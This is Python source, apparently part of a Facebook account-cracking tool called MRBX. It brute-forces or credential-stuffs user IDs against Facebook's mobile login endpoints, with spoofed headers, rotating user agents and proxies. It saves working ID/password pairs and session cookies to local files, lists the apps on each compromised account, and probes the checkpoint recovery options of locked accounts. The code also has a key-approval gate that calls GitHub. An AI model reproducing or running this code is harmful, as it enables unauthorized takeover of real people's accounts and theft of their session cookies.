    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
            ses.headers.update = {'Host': 'm.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{K}\n[ACCOUNT-CP]\n[✘] User : {idf}\n[✘] Pass : {pw}{N}')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{H}\n[ ➣✔ACCOUNT OK✔ ]\n[✔] ID User : {idf}\n Account Pass : {pw}\n cookis : {kuki}\n{ua}{N}')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                cek_MRBX(kuki)
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackmbasic_MRBX(idf,pwv,nmf):
	global loop,ok,cp
	sys.stdout.write(f"\r[ [VIP] [ACCOUNT OK]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('%s[%s•%s]%s═════════════════════════════════%s'%(P,H,P,M))
				print(f'\r{K}\n[ SOTAW-CP ]\n[✘] User :{idf}\n[✘] Pass :{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				print('%s[%s•%s]%s═════════════════════════════════%s\n'%(P,H,P,M))
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('%s[%s•%s]%s═════════════════════════════════%s'%(P,H,P,M))
				print(f'\r{H}\n[ ✔ACCOUNT OK✔ ]\n ID User : {idf}\n Pass :{pw}|{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				print('%s[%s•%s]%s═════════════════════════════════%s\n'%(P,H,P,M))
				ceker(idf,pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s[MRBX]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[MRBX]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[MRBX]---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[MRBX]%s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s[MRBX]%s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s[MRBX]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[MRBX]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[MRBX]%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[MRBX]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[MRBX]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[MRBX]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_MRBX(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

# 							[ approval ] 								#
def reg():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
    banner()
    print ('')
    print ('                  [\033[1;97m\033[1;41m wait a minute \033[0m\033[1;93m]')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.mrbx.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/mrbx001/approval.txt/main/mrbx').text
    if to in r:
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
        banner()
        print('      [\033[1;97m\033[1;41m  YOU NEED APPROVAL    \033[0m\033[1;93m]')
        print ('\n               YOUR KEY : \n' + to)
        print('      [\033[1;97m\033[1;41m  YOUR KEY SENT TO ADDMIN    \033[0m\033[1;93m]')
        name = input("               YOUR NAME : ")
        input('                     [\033[1;97m\033[1;41m  CLICK INTER   \033[0m\033[1;93m]')
        time.sleep(3.5)
        os.system('xdg-open https://m.me/it.is.Masudvai.143')
  
  
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
